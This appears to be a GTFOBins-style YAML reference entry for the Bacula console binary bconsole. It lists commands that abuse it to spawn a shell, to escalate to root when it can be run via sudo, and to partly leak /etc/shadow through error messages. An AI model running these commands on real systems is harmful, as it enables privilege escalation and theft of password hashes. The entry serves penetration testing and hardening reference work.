---
functions:
  shell:
    - code: |
        bconsole
        @exec /bin/sh
  sudo:
    - code: |
        sudo bconsole
        @exec /bin/sh
  file-read:
    - description: The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.
      code: bconsole -c /etc/shadow
---
